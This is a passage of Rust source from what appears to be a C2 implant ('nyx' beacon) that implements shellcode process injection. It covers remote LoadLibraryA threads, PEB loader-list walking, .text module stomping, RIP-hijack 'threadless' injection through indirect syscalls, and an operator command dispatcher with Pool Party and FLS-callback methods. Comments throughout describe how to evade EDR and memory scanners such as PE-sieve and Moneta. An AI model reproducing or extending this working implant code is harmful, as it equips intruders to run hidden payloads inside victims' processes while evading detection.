    h: *mut core::ffi::c_void,
    dll: &[u8],
) -> Result<*mut core::ffi::c_void, &'static str> {
    // 1. Allocate a remote page for the DLL path string.
    let path_len = dll.len(); // includes the NUL
    let remote_path = unsafe {
        (fns.vax)(
            h,
            core::ptr::null(),
            path_len,
            0x3000, /* COMMIT|RESERVE */
            0x04,   /* RW */
        )
    };
    if remote_path.is_null() {
        return Err("VirtualAllocEx (path)");
    }
    // 2. Write the DLL path into the remote allocation.
    let mut written: usize = 0;
    let w_ok = unsafe { (fns.wpm)(h, remote_path, dll.as_ptr(), path_len, &mut written) };
    if w_ok == 0 {
        unsafe {
            let _ = (fns.vfx)(h, remote_path, 0, 0x8000 /* RELEASE */);
        }
        return Err("WriteProcessMemory (path)");
    }
    Ok(remote_path)
}

/// Steps 3-5: fire CreateRemoteThread(LoadLibraryA, remote_path), wait for
/// LoadLibraryA to complete in the target, then read the thread exit code
/// (the truncated HMODULE) and close the thread handle. Returns the exit code.
unsafe fn remote_load_library_run_thread(
    fns: &RemoteLoadFns,
    h: *mut core::ffi::c_void,
    remote_path: *mut core::ffi::c_void,
) -> Result<u32, &'static str> {
    // 3. CreateRemoteThread(LoadLibraryA, remote_path). LoadLibraryA's address
    //    is valid remotely on the same OS build (kernel32 is mapped at a
    //    system-wide base; LoadLibraryA's RVA is identical). The thread's exit
    //    code == the loaded module handle (HMODULE) on success.
    type ThreadProc = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
    let load_lib_proc: ThreadProc = unsafe { core::mem::transmute(fns.load_lib) };
    let th = unsafe {
        (fns.crt)(
            h,
            0,
            0,
            Some(load_lib_proc),
            remote_path,
            0,
            core::ptr::null_mut(),
        )
    };
    if th.is_null() {
        let _ = unsafe { (fns.vfx)(h, remote_path, 0, 0x8000) };
        return Err("CreateRemoteThread");
    }
    // 4. Wait for LoadLibraryA to complete (it runs in the target).
    let _ = unsafe { (fns.wait)(th, 10_000) };
    // 5. Recover the cover DLL's REAL 64-bit remote base. The thread exit
    //    code is a DWORD, so GetExitCodeThread truncates the HMODULE to its
    //    low 32 bits — on x64 the cover loads above 4GB and the truncated
    //    value is a bogus low address that ReadProcessMemory rejects (this
    //    was the "ReadProcessMemory (DOS header)" failure). Walk the
    //    target's loader list (PEB → Ldr → InLoadOrderModuleList) to find
    //    the module by name instead; the truncated exit code remains only
    //    as a last-resort fallback.
    let mut exit_code: u32 = 0;
    let _ = unsafe { (fns.get_exit)(th, &mut exit_code) };
    let _ = unsafe { (fns.close)(th) };
    Ok(exit_code)
}

/// Walk the target's loader list (PEB → Ldr → InLoadOrderModuleList) and
/// return the REAL 64-bit base of the loaded module whose BaseDllName
/// case-insensitively matches `name` (ASCII, e.g. b"xpsservices.dll").
///
/// This exists because a remote `CreateRemoteThread(LoadLibraryA)` reports
/// the loaded HMODULE through the thread exit code, which is a DWORD — the
/// high 32 bits of an x64 module base are lost, leaving a bogus low address
/// that ReadProcessMemory rejects. Reading the target's own PEB recovers
/// the untruncated base.
///
/// Returns None if the PEB can't be read or the module isn't found.
///
/// `pub(crate)` (WP-A): the FLS callback path (fls.rs / method 3) polls this
/// to wait for kernel32 in a freshly-spawned running sacrificial.
pub(crate) unsafe fn remote_module_base(h: *mut core::ffi::c_void, name: &[u8]) -> Option<usize> {
    let rpm: ReadProcessMemory =
        core::mem::transmute(export_addr(b"kernel32.dll", b"ReadProcessMemory")?);
    let nqip: NtQueryInformationProcess =
        core::mem::transmute(export_addr(b"ntdll.dll", b"NtQueryInformationProcess")?);
    let ldr = unsafe { remote_module_base_ldr(h, rpm, nqip) }?;
    // InLoadOrderModuleList head at +0x10 (the sentinel == the list head).
    let mut ptr = [0u8; 8];
    unsafe { remote_read(h, rpm, ldr + 0x10, &mut ptr) }?;
    let sentinel = ldr + 0x10;
    let link = u64::from_le_bytes(ptr) as usize;
    unsafe { remote_module_base_walk(h, rpm, name, link, sentinel) }
}

/// Walk the target's InLoadOrderModuleList (up to 512 entries) and return the
/// base of the module whose BaseDllName case-insensitively matches `name`.
unsafe fn remote_module_base_walk(
    h: *mut core::ffi::c_void,
    rpm: ReadProcessMemory,
    name: &[u8],
    mut link: usize,
    sentinel: usize,
) -> Option<usize> {
    // LDR_DATA_TABLE_ENTRY (x64): InLoadOrderLinks +0x00, DllBase +0x30,
    // BaseDllName (UNICODE_STRING) +0x58 → Length u16 @+0x58, Buffer @+0x60.
    for _ in 0..512 {
        if link == 0 || link == sentinel {
            return None;
        }
        let mut entry = [0u8; 0x68];
        unsafe { remote_read(h, rpm, link, &mut entry) }?;
        let dll_base = u64::from_le_bytes([
            entry[0x30],
            entry[0x31],
            entry[0x32],
            entry[0x33],
            entry[0x34],
            entry[0x35],
            entry[0x36],
            entry[0x37],
        ]) as usize;
        let name_len = u16::from_le_bytes([entry[0x58], entry[0x59]]) as usize;
        let name_buf = u64::from_le_bytes([
            entry[0x60],
            entry[0x61],
            entry[0x62],
            entry[0x63],
            entry[0x64],
            entry[0x65],
            entry[0x66],
            entry[0x67],
        ]) as usize;
        if name_len / 2 == name.len() && name_buf != 0 && name_len <= 520 {
            let mut wname = [0u8; 520];
            unsafe { remote_read(h, rpm, name_buf, &mut wname[..name_len]) }?;
            if remote_module_base_name_matches(name, &wname) {
                return Some(dll_base);
            }
        }
        link = u64::from_le_bytes([
            entry[0], entry[1], entry[2], entry[3], entry[4], entry[5], entry[6], entry[7],
        ]) as usize;
    }
    None
}

type NtQueryInformationProcess = unsafe extern "system" fn(
    *mut core::ffi::c_void, // ProcessHandle
    u32,                    // ProcessInformationClass
    *mut core::ffi::c_void, // ProcessInformation
    u32,                    // ProcessInformationLength
    *mut u32,               // ReturnLength
) -> i32;

/// Read exactly `buf.len()` remote bytes; None on short read.
unsafe fn remote_read(
    h: *mut core::ffi::c_void,
    rpm: ReadProcessMemory,
    addr: usize,
    buf: &mut [u8],
) -> Option<()> {
    let mut got: usize = 0;
    let ok = unsafe {
        rpm(
            h,
            addr as *const _,
            buf.as_mut_ptr() as *mut _,
            buf.len(),
            &mut got,
        )
    };
    if ok == 0 || got != buf.len() {
        None
    } else {
        Some(())
    }
}

/// Read the target PEB (via NQIP ProcessBasicInformation) then the
/// `PEB.Ldr` pointer at +0x18. Returns the Ldr pointer.
unsafe fn remote_module_base_ldr(
    h: *mut core::ffi::c_void,
    rpm: ReadProcessMemory,
    nqip: NtQueryInformationProcess,
) -> Option<usize> {
    // ProcessBasicInformation (class 0): PebBaseAddress is the pointer-sized
    // field at offset 8 of the 48-byte PROCESS_BASIC_INFORMATION.
    let mut pbi = [0u8; 48];
    let mut ret_len: u32 = 0;
    if unsafe { nqip(h, 0, pbi.as_mut_ptr() as *mut _, 48, &mut ret_len) } != 0 {
        return None;
    }
    let peb = u64::from_le_bytes([
        pbi[8], pbi[9], pbi[10], pbi[11], pbi[12], pbi[13], pbi[14], pbi[15],
    ]) as usize;
    if peb == 0 {
        return None;
    }
    // PEB.Ldr at +0x18 → PEB_LDR_DATA; InLoadOrderModuleList head at +0x10.
    let mut ptr = [0u8; 8];
    if unsafe { remote_read(h, rpm, peb + 0x18, &mut ptr) }.is_none() {
        return None;
    }
    let ldr = u64::from_le_bytes(ptr) as usize;
    if ldr == 0 {
        return None;
    }
    Some(ldr)
}

/// Case-insensitive ASCII compare of `name` against the UTF-16 `wname` bytes.
fn remote_module_base_name_matches(name: &[u8], wname: &[u8]) -> bool {
    for (i, &b) in name.iter().enumerate() {
        let wc = u16::from_le_bytes([wname[i * 2], wname[i * 2 + 1]]);
        if wc > 0xFF || (wc as u8).to_ascii_lowercase() != b.to_ascii_lowercase() {
            return false;
        }
    }
    true
}

/// The REAL remote .text region: read the cover DLL's PE headers from the
/// target and parse the `.text` section's VirtualAddress + VirtualSize. base+len
/// are exact to the cover's in-memory layout (not a fixed sentinel).
///
/// # Safety
/// `cover_base` must be a live module base in the target `h`.
unsafe fn remote_text_region(
    h: *mut core::ffi::c_void,
    cover_base: usize,
) -> Result<RemoteRegion, &'static str> {
    let rpm: ReadProcessMemory = core::mem::transmute(
        export_addr(b"kernel32.dll", b"ReadProcessMemory").ok_or("ReadProcessMemory")?,
    );
    // Read the DOS header (first 64 bytes) to get e_lfanew.
    let e_lfanew = unsafe { remote_text_region_dos_header(h, rpm, cover_base) }?;
    // Read the NT headers (24-byte signature + FileHeader) to get section count
    // + size of optional header.
    let nt_off = cover_base + e_lfanew;
    let (num_sections, size_opt_hdr) = unsafe { remote_text_region_nt_headers(h, rpm, nt_off) }?;
    let sections_off = nt_off + 24 + size_opt_hdr;
    // Scan the section headers (40 bytes each) for ".text".
    for i in 0..num_sections {
        if let Some(region) =
            unsafe { remote_text_region_section(h, rpm, cover_base, sections_off + i * 40) }
        {
            return Ok(region);
        }
    }
    Err("remote cover: .text section not found")
}

/// Read the DOS header (first 64 bytes) to get e_lfanew.
unsafe fn remote_text_region_dos_header(
    h: *mut core::ffi::c_void,
    rpm: ReadProcessMemory,
    cover_base: usize,
) -> Result<usize, &'static str> {
    let mut dos = [0u8; 64];
    let mut got: usize = 0;
    if unsafe {
        rpm(
            h,
            cover_base as *const _,
            dos.as_mut_ptr() as *mut _,
            64,
            &mut got,
        )
    } == 0
        || got != 64
    {
        return Err("ReadProcessMemory (DOS header)");
    }
    if dos[0] != b'M' || dos[1] != b'Z' {
        return Err("remote cover: bad MZ");
    }
    Ok(i32::from_le_bytes([dos[60], dos[61], dos[62], dos[63]]) as usize)
}

/// Read the NT headers (24-byte signature + FileHeader) to get section count
/// + size of optional header. We need bytes 6..8 (NumSections) and 20..22
/// (SizeOfOptionalHeader) of the COFF header (which follows the 4-byte sig).
unsafe fn remote_text_region_nt_headers(
    h: *mut core::ffi::c_void,
    rpm: ReadProcessMemory,
    nt_off: usize,
) -> Result<(usize, usize), &'static str> {
    let mut nt = [0u8; 24];
    let mut got: usize = 0;
    if unsafe {
        rpm(
            h,
            nt_off as *const _,
            nt.as_mut_ptr() as *mut _,
            24,
            &mut got,
        )
    } == 0
        || got != 24
    {
        return Err("ReadProcessMemory (NT headers)");
    }
    if nt[0] != b'P' || nt[1] != b'E' {
        return Err("remote cover: bad PE");
    }
    let num_sections = u16::from_le_bytes([nt[6], nt[7]]) as usize;
    let size_opt_hdr = u16::from_le_bytes([nt[20], nt[21]]) as usize;
    Ok((num_sections, size_opt_hdr))
}

/// Read one 40-byte section header; Some(region) when it is ".text".
unsafe fn remote_text_region_section(
    h: *mut core::ffi::c_void,
    rpm: ReadProcessMemory,
    cover_base: usize,
    sec_off: usize,
) -> Option<RemoteRegion> {
    let mut sec = [0u8; 40];
    let mut got: usize = 0;
    if unsafe {
        rpm(
            h,
            sec_off as *const _,
            sec.as_mut_ptr() as *mut _,
            40,
            &mut got,
        )
    } == 0
        || got != 40
    {
        return None; // skip unreadable section
    }
    if &sec[0..5] == b".text" {
        let vsize = u32::from_le_bytes([sec[8], sec[9], sec[10], sec[11]]) as usize;
        let vaddr = u32::from_le_bytes([sec[12], sec[13], sec[14], sec[15]]) as usize;
        // Cap the stomp region to a sane max (never overwrite a huge .text
        // if the shellcode is tiny) — use min(section size, 0x2000).
        let len = vsize.min(0x2000);
        Some(RemoteRegion {
            base: cover_base + vaddr,
            len,
            vsize,
        })
    } else {
        None
    }
}

struct RemoteRegion {
    base: usize,
    len: usize,
    /// Real `.text` VirtualSize (not the 0x2000 stomp-window cap).
    vsize: usize,
}
unsafe fn remote_protect(
    h: *mut core::ffi::c_void,
    base: usize,
    len: usize,
    prot: u32,
) -> Result<(), &'static str> {
    let vpx: VirtualProtectEx = core::mem::transmute(
        export_addr(b"kernel32.dll", b"VirtualProtectEx").ok_or("VirtualProtectEx")?,
    );
    let mut old: u32 = 0;
    if unsafe { vpx(h, base as *const _, len, prot, &mut old) } == 0 {
        Err("VirtualProtectEx")
    } else {
        Ok(())
    }
}
unsafe fn remote_write(
    h: *mut core::ffi::c_void,
    base: usize,
    data: &[u8],
) -> Result<(), &'static str> {
    let wpm: WriteProcessMemory = core::mem::transmute(
        export_addr(b"kernel32.dll", b"WriteProcessMemory").ok_or("WriteProcessMemory")?,
    );
    let mut written: usize = 0;
    if unsafe { wpm(h, base as *mut _, data.as_ptr(), data.len(), &mut written) } == 0 {
        Err("WriteProcessMemory")
    } else {
        Ok(())
    }
}
unsafe fn resume_thread(h: *mut core::ffi::c_void) -> Result<(), &'static str> {
    let rt: ResumeThread =
        core::mem::transmute(export_addr(b"kernel32.dll", b"ResumeThread").ok_or("ResumeThread")?);
    if unsafe { rt(h) } == 0xFFFFFFFF {
        Err("ResumeThread")
    } else {
        Ok(())
    }
}

/// 16-byte-aligned CONTEXT buffer. `NtSetContextThread`/`NtGetContextThread`
/// require DECLSPEC_ALIGN(16) on the CONTEXT (the XMM register fields are
/// accessed with aligned moves). A plain `[u8; 1232]` has alignment 1, which
/// corrupts the beacon thread when the kernel does aligned stores into the
/// buffer. Mirrors [`nyx_implant_core::context::Context`] (`#[repr(C, align(16))]`).
#[repr(C, align(16))]
struct AlignedContext([u8; 1232]);

// ============================================================================
// ThreadlessInject — HWBP-based, no .text overwrite (PE-sieve hash-clean).
// ============================================================================

/// Threadless injection via hardware breakpoint (HWBP).
///
/// **Unlike module stomping**, this does NOT overwrite any module's `.text`.
/// Instead:
/// 1. Allocate private RW memory in the target (`NtAllocateVirtualMemory`).
/// 2. Write shellcode there, then protect the region RX (never leave RWX).
/// 3. Suspend the target's main thread.
/// 4. Scan DR0-DR3 for the first unused slot, set DRn = shellcode address.
/// 5. Resume — the thread hits the HWBP on its next instruction at DRn,
///    redirecting execution to the shellcode.
///
/// **PE-sieve clean:** no module `.text` is modified → no hash mismatch.
/// The shellcode runs from private RX memory (Moneta may flag this as
/// "private executable", but it's NOT "unbacked" in the PE-sieve sense —
/// PE-sieve's primary scan doesn't check private RX unless deep-scan is on).
///
/// **Limitation:** x64 has only 4 HWBP slots (DR0-DR3). If the target thread
/// already uses all 4, injection fails with an error. The code scans for the
/// first unused slot rather than hardcoding DR0.
///
/// **`trigger_addr` semantics:** The address the target thread is about to
/// execute (e.g. a frequently-called API entry). When the thread hits this
/// address, the HWBP fires and the VEH handler redirects RIP to the shellcode.
/// If `trigger_addr == shellcode_addr` (self-trigger), the shellcode runs
/// immediately on the next instruction.
///
/// # Safety
/// Cross-process handle + memory + thread context ops. Single-threaded.
pub unsafe fn threadless_inject(
    proc_handle: *mut core::ffi::c_void,
    main_thread: *mut core::ffi::c_void,
    shellcode: &[u8],
) -> Result<(), &'static str> {
    let rt =
        nyx_implant_core::syscalls::global().ok_or("indirect syscall runtime not initialized")?;

    let remote_base = unsafe { threadless_inject_alloc(rt, proc_handle, shellcode) }?;
    unsafe { threadless_inject_suspend(rt, main_thread) }?;
    let mut ctx = unsafe { threadless_inject_context(rt, main_thread) }?;

    // 5. Redirect RIP (offset 0x0F8) to the shellcode. On resume, the thread's
    //    next instruction will be the first byte of the shellcode — pure RIP
    //    hijack, no hardware breakpoint required.
    //
    //    v0.3.0 ALSO set DR0=sc_addr + DR7=0x1 (local execute breakpoint) with
    //    the intent of "HWBP redirects execution." But an x64 execute breakpoint
    //    traps BEFORE the instruction at DR0 runs (STATUS_SINGLE_STEP), and with
    //    DR0 == RIP == sc_addr the very first instruction raises #DB before it
    //    executes. There was no VEH registered in this path to redirect, so the
    //    OS terminated the target on the first dispatch — CRITICAL-16 in
    //    docs/audits/FULL_CODE_AUDIT_2026-07-21.md. The full threadless-inject
    //    pattern (trigger_addr in a hot API, DR0=trigger, VEH redirect) is
    //    future work; for v0.3.1 the RIP hijack alone is sufficient and correct.
    let sc_addr = remote_base as u64;
    ctx.0[0x0F8..0x0F8 + 8].copy_from_slice(&sc_addr.to_le_bytes());

    unsafe { threadless_inject_apply(rt, main_thread, &mut ctx) }
}

/// Steps 1-2: allocate RW in the target, write the shellcode, then protect
/// RX. Fail-closed: never return success with the region still RWX.
/// `pub(crate)` so `nyx_selftest_inject_threadless` can exercise the safe
/// prefix without RIP-hijacking.
pub(crate) unsafe fn threadless_inject_alloc(
    rt: &'static nyx_implant_core::syscalls::Runtime,
    proc_handle: *mut core::ffi::c_void,
    shellcode: &[u8],
) -> Result<usize, &'static str> {
    // 1. Allocate RW (not RWX) in target for shellcode.
    let mut remote_base: usize = 0;
    let mut region_size: usize = shellcode.len();
    let alloc_status = unsafe {
        nyx_implant_core::syscalls::nt_allocate_virtual_memory(
            rt,
            proc_handle as usize,
            0, // ZeroBits
            &mut remote_base,
            &mut region_size,
            0x3000, // MEM_COMMIT | MEM_RESERVE
            crate::stealth::payload_alloc_protect(),
        )
    };
    match alloc_status {
        Some(s) if s >= 0 => {}
        _ => return Err("NtAllocateVirtualMemory failed"),
    }

    // 2. Write shellcode.
    let mut written: usize = 0;
    let write_status = unsafe {
        nyx_implant_core::syscalls::nt_write_virtual_memory(
            rt,
            proc_handle as usize,
            remote_base,
            shellcode.as_ptr(),
            shellcode.len(),
            &mut written,
        )
    };
    match write_status {
        Some(s) if s >= 0 => {}
        _ => return Err("NtWriteVirtualMemory shellcode failed"),
    }

    // 3. RW → RX before RIP hijack. Mirror stomp_and_resume: a silent
    //    protect failure would leave private RWX, a louder IOC than RX.
    let mut prot_base = remote_base;
    let mut prot_size = region_size;
    let mut old_prot: u32 = 0;
    let prot_status = unsafe {
        nyx_implant_core::syscalls::nt_protect_virtual_memory_process(
            rt,
            proc_handle as usize,
            &mut prot_base,
            &mut prot_size,
            crate::stealth::desired_final_protect(),
            &mut old_prot,
        )
    };
    match prot_status {
        Some(s) if s >= 0 => {}
        _ => return Err("NtProtectVirtualMemory RW→RX failed"),
    }
    Ok(remote_base)
}

/// Step 3: suspend the main thread. Check the NTSTATUS — if suspend failed
/// (e.g. missing THREAD_SUSPEND_RESUME access) we MUST NOT proceed to
/// NtGetContextThread/NtSetContextThread on a live thread, which races
/// and can land a half-applied context mid-instruction.
unsafe fn threadless_inject_suspend(
    rt: &'static nyx_implant_core::syscalls::Runtime,
    main_thread: *mut core::ffi::c_void,
) -> Result<(), &'static str> {
    let mut prev_count: u32 = 0;
    let susp_status = unsafe {
        nyx_implant_core::syscalls::nt_suspend_thread(rt, main_thread as usize, &mut prev_count)
    };
    let susp_status = match susp_status {
        Some(s) => s,
        None => return Err("NtSuspendThread failed"),
    };
    if susp_status < 0 {
        return Err("NtSuspendThread failed");
    }
    Ok(())
}

/// Step 4: get the thread CONTEXT (include debug registers for HWBP setup).
/// On failure the thread is resumed before returning Err.
unsafe fn threadless_inject_context(
    rt: &'static nyx_implant_core::syscalls::Runtime,
    main_thread: *mut core::ffi::c_void,
) -> Result<AlignedContext, &'static str> {
    let mut ctx = AlignedContext([0u8; 1232]);
    // CONTEXT_AMD64 | CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_DEBUG_REGISTERS
    ctx.0[0x30..0x34].copy_from_slice(&0x00100013u32.to_le_bytes());
    let get_status = unsafe {
        nyx_implant_core::syscalls::nt_get_context_thread(
            rt,
            main_thread as usize,
            ctx.0.as_mut_ptr() as usize,
        )
    };
    let get_status = match get_status {
        Some(s) => s,
        None => {
            let mut dummy: u32 = 0;
            unsafe {
                nyx_implant_core::syscalls::nt_resume_thread(rt, main_thread as usize, &mut dummy)
            };
            return Err("NtGetContextThread failed");
        }
    };
    if get_status < 0 {
        let mut dummy: u32 = 0;
        unsafe {
            nyx_implant_core::syscalls::nt_resume_thread(rt, main_thread as usize, &mut dummy)
        };
        return Err("NtGetContextThread failed");
    }
    Ok(ctx)
}

/// Step 6: set the modified context + resume. On failure the thread is
/// resumed before returning Err.
unsafe fn threadless_inject_apply(
    rt: &'static nyx_implant_core::syscalls::Runtime,
    main_thread: *mut core::ffi::c_void,
    ctx: &mut AlignedContext,
) -> Result<(), &'static str> {
    //    ContextFlags left as 0x00100013 (CONTEXT_AMD64 | CONTROL | INTEGER |
    //    DEBUG_REGISTERS) — harmless that DEBUG_REGISTERS is set; we just don't
    //    mutate any DR fields, so NtSetContextThread restores the thread's
    //    existing debug-register state unchanged.
    ctx.0[0x30..0x34].copy_from_slice(&0x00100013u32.to_le_bytes());
    let set_status = unsafe {
        nyx_implant_core::syscalls::nt_set_context_thread(
            rt,
            main_thread as usize,
            ctx.0.as_mut_ptr() as usize,
        )
    };
    let set_status = match set_status {
        Some(s) => s,
        None => {
            let mut dummy: u32 = 0;
            unsafe {
                nyx_implant_core::syscalls::nt_resume_thread(rt, main_thread as usize, &mut dummy)
            };
            return Err("NtSetContextThread failed");
        }
    };
    if set_status < 0 {
        let mut dummy: u32 = 0;
        unsafe {
            nyx_implant_core::syscalls::nt_resume_thread(rt, main_thread as usize, &mut dummy)
        };
        return Err("NtSetContextThread failed");
    }
    let mut dummy: u32 = 0;
    unsafe { nyx_implant_core::syscalls::nt_resume_thread(rt, main_thread as usize, &mut dummy) };

    Ok(())
}

// ============================================================================
// do_inject — the operator-facing dispatch entry (Command::Inject handler).
// ============================================================================

/// The operator-facing injection entry point. Dispatched by `beacon::execute`
/// when a `Command::Inject` arrives. Routes to the technique selected by
/// `method`:
///
/// - `0` — **Pool Party** (section-backed delivery + worker-factory threadless dispatch).
///   Section delivery avoids VirtualAllocEx/WPM; execution via threadless
///   worker-factory queue splice (no NtCreateThreadEx remote-thread IOC).
/// - `1` — **Threadless HWBP** (existing `threadless_inject`). Requires a
///   sacrificial process (spawn_to) for the main-thread handle.
/// - `2` — **Module stomp** (existing `module_stomp`). The proven baseline.
/// - `3` — **FLS callback** ([`crate::fls::fls_callback_inject`]). Registers
///   the shellcode as an FLS callback in the target via a remote `FlsAlloc`
///   thread; a stub thread's exit-time rundown fires it. No foreign-thread
///   suspend/context hijack (AutoBypass Table 11: 60% bypass / 14 alerts).
///
/// **Methods:**
/// - `0` — Pool Party (section-backed delivery + threadless worker-factory dispatch).
///   Implemented: section delivery via NtCreateSection/NtMapViewOfSection +
///   threadless execution via worker-factory queue splice. Falls back to
///   method 2 (module stomp) on any failure with a warning prefix.
/// - `1` — ThreadlessInject HWBP (sacrificial process).
/// - `2` — Module Stomp (.text overwrite in a sacrificial process).
/// - `3` — FLS callback (existing pid or a fresh RUNNING sacrificial).
///
/// `pid`: nonzero targets an EXISTING process. Method 2 (classic remote
/// thread) and method 3 (FLS callback) accept an existing pid; method 0
/// (Pool Party) requires `pid != 0` plus the build gate; method 1
/// (threadless HWBP) requires a sacrificial process (`pid == 0` +
/// `spawn_to`). `pid == 0` spawns a fresh sacrificial process via `spawn_to`
/// (default `notepad.exe`).
///
/// Returns a `Response::Output` with a status line, or `Response::Err`.
pub fn do_inject(method: u8, pid: u32, spawn_to: &str, shellcode: &[u8]) -> nyx_protocol::Response {
    if let Some(err) = do_inject_pid_guard(pid) {
        return err;
    }
    if let Some(resp) = do_inject_pool_party(method, pid, spawn_to, shellcode) {
        return resp;
    }
    // method 0 explicitly requested but not usable — return clear error
    // instead of silently degrading (operator needs to know).
    if method == 0 {
        return nyx_protocol::Response::Err(nyx_implant_core::heap::String::from(
            "Pool Party (method 0) unavailable: gate OFF or pid=0. \
             Set NYX_POOL_PARTY_ON=1 at build + supply pid, or use method 2.",
        ));
    }
    do_inject_dispatch(method, pid, spawn_to, shellcode)
}

/// PID safety guard. Reject targets that would brick the host or the
/// beacon itself. This runs BEFORE any dispatch so future Pool Party /
/// remote-inject paths inherit the same protection. pid == 0 is the
/// documented "spawn a fresh sacrificial process" sentinel and is allowed.
/// HIGH-severity finding in docs/audits/FULL_CODE_AUDIT_2026-07-21.md.
fn do_inject_pid_guard(pid: u32) -> Option<nyx_protocol::Response> {
    if pid == 4 {
        // PID 4 = System (kernel); OpenProcess writes would BSOD.
        return Some(nyx_protocol::Response::Err(
            nyx_implant_core::heap::String::from(
                "refuse inject into pid 4 (System kernel process)",
            ),
        ));
    }
    if pid != 0 && pid == nyx_implant_core::hostinfo::pid() {
        // Self-inject serves no operational purpose and the operator almost
        // certainly meant a different target (typo / stale tasking).
        return Some(nyx_protocol::Response::Err(
            nyx_implant_core::heap::String::from(
                "refuse self-inject (target pid is the implant's own pid)",
            ),
        ));
    }
    None
}

/// method 0 (Pool Party): gated research-grade technique. When
/// POOL_PARTY_ENABLED is on (operator opt-in via NYX_POOL_PARTY_ON=1) AND a
/// target pid is supplied, attempt the section-backed threadpool splice. On
/// any failure (or when the gate is off / pid is 0), degrade to method 2
/// (module stomp) so the command stays functional end-to-end. Returns
/// `Some(response)` when the method-0 path handled the request.
fn do_inject_pool_party(
    method: u8,
    pid: u32,
    spawn_to: &str,
    shellcode: &[u8],
) -> Option<nyx_protocol::Response> {
    if method != 0 || !crate::tp::pool_party_enabled() || pid == 0 {
        return None;
    }
    match unsafe { crate::tp::pool_party_inject(pid, shellcode) } {
        Ok(()) => {
            let mut msg = nyx_implant_core::heap::String::from("Pool Party inject ok (pid=");
            let mut buf = [0u8; 10];
            let mut n = pid;
            let mut i = buf.len();
            if n == 0 {
                buf[0] = b'0';
                i = 1;
            } else {
                while n > 0 {
                    i -= 1;
                    buf[i] = b'0' + (n % 10) as u8;
                    n /= 10;
                }
            }
            for &b in &buf[i..] {
                msg.push(b as char);
            }
            msg.push_str(") — section delivery ok, threadless worker-factory dispatch (no remote-thread IOC)");
            Some(nyx_protocol::Response::Output(msg.into_bytes()))
        }
        Err(e) => {
            // g6 diagnosis (selftest builds only, 2026-08-22): when the
            // method-2 fallback ALSO fails, pool_party's own error is lost
            // from the Response — persist it so VM triage can separate
            // "pool party broken" from "fallback broken".
            #[cfg(feature = "selftest")]
            crate::selftests::write_marker("nyx_g6_pool_party.err", e.as_str());
            // Fall through to module stomp with a warning prefix.
            let mut warn = nyx_implant_core::heap::String::from("WARN: Pool Party failed (");
            warn.push_str(&e);
            warn.push_str(") — falling back to module stomp (method 2). ");
            // Use warn as the prefix for the module-stomp path below.
            let resp = do_inject(2, pid, spawn_to, shellcode);
            let prefixed = match resp {
                nyx_protocol::Response::Output(mut bytes) => {
                    let mut out = warn.into_bytes();
                    out.append(&mut bytes);
                    nyx_protocol::Response::Output(out)
                }
                nyx_protocol::Response::Err(e) => {
                    // Keep the WARN semantics when the fallback ALSO fails
                    // (2026-08-24): a bare fallback Err reads as "module
                    // stomp broken" and hides that Pool Party failed first.
                    let mut msg = warn;
                    msg.push_str("fallback also failed: ");
                    msg.push_str(&e);
                    nyx_protocol::Response::Err(msg)
                }
                other => other,
            };
            Some(prefixed)
        }
    }
}

/// Method dispatch for the remaining paths: existing-process injection
/// (method 2 + pid) and the sacrificial-process methods 1/2.
fn do_inject_dispatch(
    method: u8,
    pid: u32,
    spawn_to: &str,
    shellcode: &[u8],
) -> nyx_protocol::Response {
    let warn_prefix = nyx_implant_core::heap::String::new();
    let effective_method = method;
    // ---- Existing-process injection (method 2 + pid != 0) ----
    // implant-inject-5: dispatch on METHOD first. Only the classic-inject
    // contract (method 2) accepts an existing pid; method 1 (threadless HWBP)
    // requires a sacrificial process and must NOT silently degrade to the
    // loudest CreateRemoteThread path when given a pid.
    if pid != 0 {
        return do_inject_existing(effective_method, pid, shellcode, warn_prefix);
    }
    // ---- Sacrificial-process path (pid == 0) ----
    do_inject_sacrificial(effective_method, spawn_to, shellcode, warn_prefix)
}

/// Existing-process injection (method 2 or 3 + pid != 0).
fn do_inject_existing(
    method: u8,
    pid: u32,
    shellcode: &[u8],
    warn_prefix: nyx_implant_core::heap::String,
) -> nyx_protocol::Response {
    if method == 3 {
        return do_inject_existing_fls(pid, shellcode, warn_prefix);
    }
    if method != 2 {
        return nyx_protocol::Response::Err(nyx_implant_core::heap::String::from(
            "inject: method 1 (threadless HWBP) targets a sacrificial process; \
             existing-pid injection is method 2 (classic remote thread) or \
             method 3 (FLS callback)",
        ));
    }
    match unsafe { inject_existing(pid, shellcode) } {
        Ok(()) => {
            let mut msg = warn_prefix;
            msg.push_str("remote inject ok (pid=");
            let mut buf = [0u8; 10];
            let mut n = pid;
            let mut i = buf.len();
            if n == 0 {
                buf[0] = b'0';
                i = 1;
            } else {
                while n > 0 {
                    i -= 1;
                    buf[i] = b'0' + (n % 10) as u8;
                    n /= 10;
                }
            }
            // Append the u32→ASCII digits.
            for &b in &buf[i..] {
                msg.push(b as char);
            }
            msg.push(')');
            nyx_protocol::Response::Output(msg.into_bytes())
        }
        Err(e) => nyx_protocol::Response::Err(nyx_implant_core::heap::String::from(e)),
    }
}

/// Sacrificial-process path (pid == 0): method 1 = threadless HWBP on a
/// fresh sacrificial; method 2 = module stomp; method 3 = FLS callback into a
/// fresh RUNNING sacrificial.
fn do_inject_sacrificial(
    method: u8,
    spawn_to: &str,
    shellcode: &[u8],
    warn_prefix: nyx_implant_core::heap::String,
) -> nyx_protocol::Response {
    match method {
        1 => do_inject_sacrificial_threadless(spawn_to, shellcode),
        3 => do_inject_sacrificial_fls(spawn_to, shellcode, warn_prefix),
        2 => {
            if !modulestomp_enabled() {
                // Disarmed: creating a sacrificial just to terminate it is
                // wasteful and noisy — fail fast with a clear error instead.
                let mut msg = warn_prefix;
                msg.push_str("module stomp disabled (gate off)");
                return nyx_protocol::Response::Err(nyx_implant_core::heap::String::from(msg));
            }
            let target = if spawn_to.is_empty() {
                "notepad.exe"
            } else {
                spawn_to
            };
            match unsafe { module_stomp(target, shellcode) } {
                Ok(_proc) => {
                    // `_proc` (the Drop-guarded SacrificialProcess) drops at
                    // the end of this arm: armed-success → close-only (target
                    // is running the shellcode); disarmed → terminate the
                    // suspended sacrificial + close both handles.
                    let mut msg = warn_prefix;
                    msg.push_str("module stomp inject ok");
                    nyx_protocol::Response::Output(msg.into_bytes())
                }
                Err(e) => nyx_protocol::Response::Err(nyx_implant_core::heap::String::from(e)),
            }
        }
        _ => nyx_protocol::Response::Err(nyx_implant_core::heap::String::from(
